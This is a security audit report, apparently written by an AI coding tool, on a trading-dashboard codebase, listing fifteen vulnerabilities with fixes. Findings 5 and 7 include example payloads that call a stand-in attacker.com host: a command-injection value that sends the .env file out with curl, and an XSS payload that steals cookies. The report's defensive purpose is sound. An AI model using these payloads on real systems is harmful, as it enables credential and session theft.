# Security Audit Report: pilotai-credit-spreads

**Date:** 2026-03-24
**Auditor:** Claude Code (automated static analysis)
**Scope:** Full codebase — web dashboard, API, scripts, environment files, database access, deployment config, dependencies

---

## Summary Table

| # | Severity | Category | File | Line(s) | Issue |
|---|----------|----------|------|---------|-------|
| 1 | CRITICAL | Secrets in VCS | `.env`, `.env.exp*`, `scripts/check_accounts.py` | Multiple | Real API keys committed to version control |
| 2 | CRITICAL | SQL Injection | `shared/database.py` | 415–429 | F-string SQL queries with potentially caller-controlled input |
| 3 | CRITICAL | SQL Injection | `compass/crypto/historical_score.py` | 473 | Dynamic table name in raw query (suppressed lint warning) |
| 4 | CRITICAL | Insecure Defaults | `web_dashboard/app.py`, `deploy/macro-api/api/macro_api.py` | 61–68, 68–77 | Hardcoded dev API keys used as production fallback |
| 5 | CRITICAL | Command Injection | `pilotctl.py` | 71–79 | Shell-interpolated config values passed to tmux |
| 6 | HIGH | CORS | `web_dashboard/app.py` | 78–83 | `allow_origins=["*"]` |
| 7 | HIGH | XSS | `web_dashboard/html.py` | 303–314 | Unescaped user-sourced data inserted into HTML |
| 8 | HIGH | IDOR | `web_dashboard/app.py` | 199–216 | No ownership checks on per-experiment endpoints |
| 9 | MEDIUM | Input Validation | `web_dashboard/app.py` | 200–210 | `limit` parameter accepts negative/unbounded values |
| 10 | MEDIUM | Rate Limiting | `web_dashboard/app.py` | 93–111 | In-memory rate limits, trivially bypassed by process restart |
| 11 | MEDIUM | Info Disclosure | `web_dashboard/html.py` | 302–303 | Raw Alpaca error messages rendered in HTML |
| 12 | MEDIUM | Security Headers | `web_dashboard/app.py` | — | Missing HSTS, CSP, X-Frame-Options, X-Content-Type-Options |
| 13 | MEDIUM | CSRF | `web_dashboard/app.py` | 248–264 | No CSRF token on state-mutating admin endpoint |
| 14 | LOW | Logging | `shared/credentials.py` | 92 | API errors only logged at DEBUG level |
| 15 | LOW | Git History | `.env.exp*` | — | Secrets remain in full git history even if files are deleted |

---

## Critical Findings

### 1. CRITICAL — Real Secrets Committed to Version Control

**Files:**
- `.env` — contains `POLYGON_API_KEY` in plaintext
- `.env.exp154`, `.env.exp400`, `.env.exp503`, `.env.exp600` — contain `ALPACA_API_KEY` / `ALPACA_API_SECRET` and `TELEGRAM_BOT_TOKEN` / `TELEGRAM_CHAT_ID` in plaintext
- `scripts/check_accounts.py` (lines 16–37) — four complete Alpaca key/secret/account-ID triplets hardcoded in source

These files expose live trading credentials and a Telegram bot token. Even if removed today, they persist in `git log` forever unless history is rewritten.

**Fix:**
1. **Immediately rotate** all exposed credentials: Alpaca accounts (all exp variants), Polygon API key, Telegram bot token.
2. Rewrite git history to purge these files:
   ```bash
   git filter-repo --path '.env' --path '.env.exp036' --path '.env.exp059' \
     --path '.env.exp154' --path '.env.exp305' --path '.env.exp400' \
     --path '.env.exp401' --path '.env.exp503' --path '.env.exp600' \
     --path 'scripts/check_accounts.py' --invert-paths
   git push origin --force --all
   ```
3. Rewrite `scripts/check_accounts.py` to read credentials from environment variables only.
4. Verify `.gitignore` covers all `.env.exp*` variants — it currently does (line 93), but the files were committed before that rule existed.

---

### 2. CRITICAL — SQL Injection in `shared/database.py`

**Lines 415–418 (`load_dedup_entries`):**
```python
cutoff = f"datetime('now', '-{window_seconds} seconds')"
rows = conn.execute(
    f"SELECT ticker, direction, alert_type, last_routed_at FROM alert_dedup WHERE last_routed_at > {cutoff}"
).fetchall()
```

**Lines 428–430 (`delete_old_dedup_entries`):**
```python
conn.execute(
    f"DELETE FROM alert_dedup WHERE last_routed_at <= datetime('now', '-{window_seconds} seconds')"
)
```

`window_seconds` is interpolated directly into SQL. If a caller ever passes a user-controlled value, an attacker can inject arbitrary SQL.

**Fix — use parameterized queries:**
```python
# load_dedup_entries
rows = conn.execute(
    "SELECT ticker, direction, alert_type, last_routed_at FROM alert_dedup "
    "WHERE last_routed_at > datetime('now', ?)",
    (f"-{int(window_seconds)} seconds",)
).fetchall()

# delete_old_dedup_entries
conn.execute(
    "DELETE FROM alert_dedup WHERE last_routed_at <= datetime('now', ?)",
    (f"-{int(window_seconds)} seconds",)
)
```

Also cast `window_seconds` to `int` before use to reject non-numeric input.

---

### 3. CRITICAL — SQL Injection via Dynamic Table Name in `compass/crypto/historical_score.py`

**Line 473:**
```python
cur = self._conn.execute(f"SELECT date FROM {table}")  # noqa: S608
```

The `# noqa: S608` comment shows this was flagged by a linter and silenced rather than fixed. SQLite does not support parameterized table names, so the correct fix is a whitelist:

**Fix:**
```python
ALLOWED_SCORE_TABLES = frozenset({
    "btc_daily", "total_market_daily", "fear_greed_daily", "btc_funding_settlements"
})

def _query_dates(self, table: str) -> list:
    if table not in ALLOWED_SCORE_TABLES:
        raise ValueError(f"Unknown table: {table!r}")
    cur = self._conn.execute(f"SELECT date FROM {table}")  # safe: whitelisted
    return cur.fetchall()
```

Remove the `# noqa` suppression once fixed.

---

### 4. CRITICAL — Hardcoded Default API Keys as Production Fallback

**`web_dashboard/app.py` (lines 61–68):**
```python
_DEFAULT_API_KEY = "dev-attix-2026"
_API_KEY = os.environ.get("DASHBOARD_API_KEY", _DEFAULT_API_KEY)
```

**`deploy/macro-api/api/macro_api.py` (lines 68, 77):**
```python
_DEFAULT_DEV_KEY = "dev-attix-macro-2026"
raw = os.getenv("MACRO_API_KEYS", _DEFAULT_DEV_KEY)
```

If `DASHBOARD_API_KEY` or `MACRO_API_KEYS` are not set in the Railway environment, the API silently accepts a well-known public key. Any attacker can authenticate with `dev-attix-2026` or `dev-attix-macro-2026`.

The dashboard also logs whether the default is active (line 278–279), leaking this fact to anyone with log access.

**Fix — fail fast instead of defaulting:**
```python
_API_KEY = os.environ.get("DASHBOARD_API_KEY")
if not _API_KEY:
    raise RuntimeError("DASHBOARD_API_KEY environment variable must be set before starting")
```

Do the same in `macro_api.py`. Remove the startup log line that announces default-key usage.

---

### 5. CRITICAL — Command Injection in `pilotctl.py`

**Lines 71–79:**
```python
cmd = (
    f"python main.py scheduler "
    f"--config {cfg['config_file']} "
    f"--env-file {cfg['env_file']}"
)
subprocess.run(
    ["tmux", "new-session", "-d", "-s", session, cmd],
    check=True,
)
```

`cmd` is a **string** passed as a single tmux argument. Any shell metacharacters in `cfg['config_file']` or `cfg['env_file']` (spaces, semicolons, backticks, `$(...)`) will be interpreted by the shell tmux uses to launch the command.

Malicious `pilotctl.yaml` entry:
```yaml
config_file: "config.yaml; curl http://attacker.com/$(cat .env) #"
```

**Fix — use a list, never a string, for subprocess arguments:**
```python
subprocess.run(
    [
        "tmux", "new-session", "-d", "-s", session,
        sys.executable, "main.py", "scheduler",
        "--config", cfg["config_file"],
        "--env-file", cfg["env_file"],
    ],
    check=True,
)
```

Also validate that `cfg['config_file']` and `cfg['env_file']` are paths that actually exist before passing them.

---

## High Findings

### 6. HIGH — Wildcard CORS

**`web_dashboard/app.py` (lines 78–83):**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["GET"],
    allow_headers=["*"],
)
```

Any origin can make credentialed GET requests to the API. Combined with finding #4 (default dev key), this allows a malicious webpage to exfiltrate all trade and experiment data from any user who visits it.

**Fix:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://your-dashboard-domain.up.railway.app"],
    allow_methods=["GET"],
    allow_headers=["X-API-Key"],
)
```

If the dashboard is only accessed directly (not via a browser cross-origin), remove `CORSMiddleware` entirely.

---

### 7. HIGH — XSS via Unescaped HTML in `web_dashboard/html.py`

**Lines 303–314:**
```python
alpaca_detail = f'<div class="no-alpaca">{err_msg}</div>'
...
<div class="exp-id-line">{s['id']}</div>
<div class="exp-name">{s['name']}</div>
...
&nbsp; by {s.get('creator','—')} &nbsp;&bull;&nbsp; live since {s.get('live_since','—')}
```

Fields like `s['name']`, `s['creator']`, `err_msg`, and `s['id']` are inserted into HTML without escaping. If any of these values are writable by a user (e.g., via the admin push-data endpoint), an attacker can inject arbitrary JavaScript:

```json
{"name": "<img src=x onerror='fetch(\"https://attacker.com/?\"+document.cookie)'>"}
```

**Fix — escape all dynamic values before insertion:**
```python
from html import escape

alpaca_detail = f'<div class="no-alpaca">{escape(err_msg)}</div>'
...
<div class="exp-id-line">{escape(s['id'])}</div>
<div class="exp-name">{escape(s['name'])}</div>
...
&nbsp; by {escape(s.get('creator', '—'))}
```

Or migrate templates to Jinja2, which escapes by default.

---

### 8. HIGH — IDOR on Experiment Endpoints

**`web_dashboard/app.py` (lines 199–216):**
```python
@app.get("/api/v1/experiments/{exp_id}/trades")
async def experiment_trades(exp_id: str, limit: int = 100, _key: str = Depends(require_api_key)):
    registry = _cached("registry", 30.0, load_registry)
    exp = registry["experiments"].get(exp_id.upper())
    ...
    trades = get_trades(exp, limit=min(limit, 500))
```

Any holder of a valid API key (including the default `dev-attix-2026`) can request trade history for **any** experiment by guessing its ID (e.g., `EXP154`, `EXP400`). There is no ownership or permission check.

**Fix:**
Implement a per-key permission set in the registry or environment config, and verify that the requesting key has access to the requested experiment before returning data.

---

## Medium Findings

### 9. MEDIUM — Missing Query Parameter Validation

**`web_dashboard/app.py` (line 200):**
```python
async def experiment_trades(exp_id: str, limit: int = 100, ...):
    trades = get_trades(exp, limit=min(limit, 500))
```

`limit` can be negative or zero; `min(negative, 500)` still produces a negative value, which may cause unexpected behavior in `get_trades`. FastAPI's `Query()` validator handles this cleanly:

```python
from fastapi import Query

async def experiment_trades(
    exp_id: str,
    limit: int = Query(default=100, ge=1, le=500),
    ...
):
```

---

### 10. MEDIUM — In-Memory Rate Limiting Bypassed by Process Restart

**`web_dashboard/app.py` (lines 93–111):**

The rate limiter uses a `defaultdict(deque)` stored in process memory. It resets on every deploy or crash. An attacker can bypass limits by sending requests immediately after a restart. Use a persistent store (Redis, or a lightweight SQLite counter) keyed by IP or API key.

---

### 11. MEDIUM — Raw Alpaca Error Messages Rendered in HTML

**`web_dashboard/html.py` (lines 302–303):**
```python
alp_error = alp.get("error")
alpaca_detail = f'<div class="no-alpaca">{err_msg}</div>'
```

Raw API error strings (which may include partial key material, account IDs, or internal endpoint paths) are rendered directly in the page HTML. Log errors server-side; show only a generic message in the UI:

```python
if alp_error:
    logger.error("Alpaca error for %s: %s", s['id'], alp_error)
    alpaca_detail = '<div class="no-alpaca">Alpaca account unavailable</div>'
```

---

### 12. MEDIUM — Missing Security Headers

No security headers are set anywhere in the application. Add a middleware:

```python
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["Content-Security-Policy"] = "default-src 'self'; style-src 'self' 'unsafe-inline'"
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

---

### 13. MEDIUM — No CSRF Protection on Admin Endpoint

**`web_dashboard/app.py` (lines 248–264):**
```python
@app.post("/api/admin/push-data")
async def push_data(request: Request, _key: str = Depends(require_api_key)):
    body = await request.json()
    PUSHED_DATA_PATH.write_text(_json.dumps(body, indent=2))
```

This endpoint writes files based on request body content. A CSRF attack could trick an authenticated admin's browser into submitting crafted data. Add a `SameSite=Strict` cookie or require a `X-Requested-With: XMLHttpRequest` header to block cross-site form submissions.

---

## Low Findings

### 14. LOW — Alpaca API Errors Silently Dropped at DEBUG Level

**`shared/credentials.py` (line 92):**
```python
logger.debug("Alpaca %s failed: %s", url, exc)
```

Production log level is typically INFO or WARNING. API call failures will be invisible, making live-trading incidents hard to diagnose.

**Fix:** Use `logger.warning(...)` or `logger.error(...)` for API failures.

---

### 15. LOW — Secrets Remain in Git History

Even after adding `.env.exp*` to `.gitignore` (line 93), the files still exist in all prior commits. Anyone who clones the repo or accesses the git object store can recover them with `git log --all -- .env.exp154` or `git show <commit>:.env.exp154`.

**Fix:** See Finding #1 — use `git filter-repo` to rewrite history, then force-push all branches. Notify all collaborators to re-clone.

---

## Recommended Immediate Actions (Priority Order)

1. **[NOW]** Rotate all exposed credentials: Alpaca keys for all `exp*` accounts, Polygon API key, Telegram bot token.
2. **[NOW]** Rewrite git history to purge `.env`, `.env.exp*`, and `scripts/check_accounts.py`.
3. **[HIGH]** Rewrite `scripts/check_accounts.py` to use environment variables only.
4. **[HIGH]** Fix SQL injection in `shared/database.py` (lines 415–429) — parameterized queries.
5. **[HIGH]** Fix SQL injection in `compass/crypto/historical_score.py` (line 473) — whitelist table names, remove `# noqa`.
6. **[HIGH]** Remove default API key fallbacks in `app.py` and `macro_api.py` — fail fast if env var not set.
7. **[HIGH]** Fix command injection in `pilotctl.py` (lines 71–79) — list-based subprocess args.
8. **[HIGH]** HTML-escape all dynamic values in `web_dashboard/html.py`.
9. **[MEDIUM]** Restrict CORS to specific known origins.
10. **[MEDIUM]** Add security headers middleware.
11. **[MEDIUM]** Add per-experiment ownership checks to prevent IDOR.
12. **[MEDIUM]** Validate `limit` and other query parameters using FastAPI `Query(ge=..., le=...)`.
13. **[LOW]** Upgrade Alpaca error logging from DEBUG to WARNING.

---

*Audit performed via static analysis of source files. No dynamic testing or fuzzing was conducted. Additional vulnerabilities may exist in runtime behavior, third-party libraries, or infrastructure not covered by this review.*
